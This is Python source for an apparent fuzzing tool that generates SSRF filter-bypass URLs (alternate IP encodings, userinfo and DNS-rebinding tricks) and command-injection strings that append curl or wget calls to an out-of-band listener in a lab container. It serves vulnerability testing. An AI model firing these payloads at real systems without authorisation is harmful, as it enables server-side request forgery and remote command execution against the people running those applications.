import random
import string
import time

from mutator import ParamMutator

# ---------------------------------------------------------------------------
# OOB listener
# ---------------------------------------------------------------------------
import os
OOB_HOST     = os.environ.get("FUZZER_OOB_HOST", "172.20.0.10")
OOB_PORT     = int(os.environ.get("FUZZER_OOB_PORT", "8000"))
OOB_DOMAIN   = "oob"          # wildcard *.oob → 172.20.0.10 via dnsmasq
OOB_HOSTNAME = "oob.phuzz"    # plain hostname → 172.20.0.10 via extra_hosts (/etc/hosts)

# Pre-computed alternate IP representations of 172.20.0.10
_IP_DECIMAL = 2886795274     # 172*2^24 + 20*2^16 + 0*2^8 + 10
_IP_HEX     = "0xac14000a"   # 0xAC=172, 0x14=20, 0x00=0, 0x0A=10
_IP_OCTAL    = "0254.024.0.012"
_IP_IPV6_HEX = "::ffff:ac14:a"  # ::ffff:ac14:000a = ::ffff:172.20.0.10


class SSRFMutator(ParamMutator):
    """
    ParamMutator that injects SSRF payloads — round-robin across bypass variants.

    IP-based variants (token in URL path):
      0   plain IP            http://172.20.0.10:8000/<token>
      1   decimal IP          http://2886795274:8000/<token>
      2   hex IP              http://0xac14000a:8000/<token>
      3   octal IP            http://0254.024.0.012:8000/<token>
      4   IPv6 mapped dotted  http://[::ffff:172.20.0.10]:8000/<token>
      5   IPv6 mapped hex     http://[::ffff:ac14:a]:8000/<token>
      6   URL-encoded dot     http://172.20.0%2e10:8000/<token>
      7   double-encoded dot  http://172.20.0%252e10:8000/<token>
      8   userinfo trick      http://x@172.20.0.10:8000/<token>
      9   reverse userinfo    http://trusted.com@172.20.0.10:8000/<token>
     10   mixed-case scheme   HTTP://172.20.0.10:8000/<token>
     11   trailing dot        http://172.20.0.10.:8000/<token>
     12   fragment bypass     http://172.20.0.10:8000/<token>#trusted.com
     13   nip.io              http://172.20.0.10.nip.io:8000/<token>
     14   sslip.io            http://172.20.0.10.sslip.io:8000/<token>

    DNS-based variants (token in subdomain, resolved via dnsmasq *.oob):
     15   plain domain        http://<token>.oob:8000/
     16   HTTPS domain        https://<token>.oob:8000/
     17   userinfo+domain     http://x@<token>.oob:8000/
     18   mixed-case domain   HTTP://<token>.oob:8000/

    Hostname-based bypass (extra_hosts in web container, token in path):
     19   oob.phuzz hostname  http://oob.phuzz:8000/<token>
     20   oob.phuzz HTTPS     oob.phuzz:8443/<token>#  (no scheme — for apps that prepend https:// themselves, e.g. Canto)
    """

    _token_map: dict = {}
    _variant_index: int = 0
    _NUM_VARIANTS: int = 21

    def mutate(self, string: str) -> str:
        token = SSRFMutator._generate_token()
        SSRFMutator._token_map[token] = time.time()

        idx = SSRFMutator._variant_index % SSRFMutator._NUM_VARIANTS
        SSRFMutator._variant_index += 1

        host = OOB_HOST
        port = OOB_PORT

        # --- IP-based ---
        if idx == 0:
            payload = f"http://{host}:{port}/{token}"
        elif idx == 1:
            payload = f"http://{_IP_DECIMAL}:{port}/{token}"
        elif idx == 2:
            payload = f"http://{_IP_HEX}:{port}/{token}"
        elif idx == 3:
            payload = f"http://{_IP_OCTAL}:{port}/{token}"
        elif idx == 4:
            payload = f"http://[::ffff:{host}]:{port}/{token}"
        elif idx == 5:
            payload = f"http://[{_IP_IPV6_HEX}]:{port}/{token}"
        elif idx == 6:
            payload = f"http://172.20.0%2e10:{port}/{token}"
        elif idx == 7:
            payload = f"http://172.20.0%252e10:{port}/{token}"
        elif idx == 8:
            payload = f"http://x@{host}:{port}/{token}"
        elif idx == 9:
            payload = f"http://trusted.com@{host}:{port}/{token}"
        elif idx == 10:
            payload = f"HTTP://{host}:{port}/{token}"
        elif idx == 11:
            payload = f"http://{host}.:{port}/{token}"
        elif idx == 12:
            payload = f"http://{host}:{port}/{token}#trusted.com"
        elif idx == 13:
            payload = f"http://{host}.nip.io:{port}/{token}"
        elif idx == 14:
            payload = f"http://{host}.sslip.io:{port}/{token}"
        # --- DNS-based (token in subdomain → dnsmasq resolves *.oob) ---
        elif idx == 15:
            payload = f"http://{token}.{OOB_DOMAIN}:{port}/"
        elif idx == 16:
            payload = f"https://{token}.{OOB_DOMAIN}:{port}/"
        elif idx == 17:
            payload = f"http://x@{token}.{OOB_DOMAIN}:{port}/"
        elif idx == 18:
            payload = f"HTTP://{token}.{OOB_DOMAIN}:{port}/"
        elif idx == 19:  # hostname bypass (works even when direct IP is blocked)
            payload = f"http://{OOB_HOSTNAME}:{port}/{token}"
        else:  # idx == 20 — scheme-less HTTPS bypass (app prepends https://, e.g. Canto)
            payload = f"{OOB_HOSTNAME}:8443/{token}#"

        return payload

    @staticmethod
    def _generate_token() -> str:
        alphabet = string.ascii_lowercase + string.digits
        return "".join(random.choices(alphabet, k=8))


class CmdInjectionSSRFMutator(ParamMutator):
    """
    ParamMutator that injects command-injection payloads containing an OOB URL.
    Used for endpoints where user input flows into shell_exec / system / exec / etc.

    The original parameter value is preserved as the "legitimate" part so the
    application logic still works before the injected command runs.

    Variants (token in URL path, appended after the original value):
      0   semicolon            <val>; curl http://172.20.0.10:8000/<token>
      1   pipe                 <val> | curl -s http://172.20.0.10:8000/<token>
      2   background           <val>& curl http://172.20.0.10:8000/<token> &
      3   logical-and          <val> && curl http://172.20.0.10:8000/<token>
      4   subshell             <val> $(curl -s http://172.20.0.10:8000/<token>)
      5   backtick             <val> `curl -s http://172.20.0.10:8000/<token>`
      6   wget pipe            <val>; wget -q -O- http://172.20.0.10:8000/<token>
      7   newline              <val>\ncurl http://172.20.0.10:8000/<token>
      8   null-byte-semi       <val>%00; curl http://172.20.0.10:8000/<token>
      9   oob.phuzz hostname   <val>; curl http://oob.phuzz:8000/<token>
    """

    _variant_index: int = 0
    _NUM_VARIANTS: int = 10

    def mutate(self, value: str) -> str:
        token = SSRFMutator._generate_token()
        SSRFMutator._token_map[token] = time.time()

        idx = CmdInjectionSSRFMutator._variant_index % CmdInjectionSSRFMutator._NUM_VARIANTS
        CmdInjectionSSRFMutator._variant_index += 1

        url = f"http://{OOB_HOST}:{OOB_PORT}/{token}"

        if idx == 0:
            payload = f"{value}; curl {url}"
        elif idx == 1:
            payload = f"{value} | curl -s {url}"
        elif idx == 2:
            payload = f"{value}& curl {url} &"
        elif idx == 3:
            payload = f"{value} && curl {url}"
        elif idx == 4:
            payload = f"{value} $(curl -s {url})"
        elif idx == 5:
            payload = f"{value} `curl -s {url}`"
        elif idx == 6:
            payload = f"{value}; wget -q -O- {url}"
        elif idx == 7:
            payload = f"{value}\ncurl {url}"
        elif idx == 8:
            payload = f"{value}%00; curl {url}"
        else:  # idx == 9
            payload = f"{value}; curl http://{OOB_HOSTNAME}:{OOB_PORT}/{token}"

        return payload
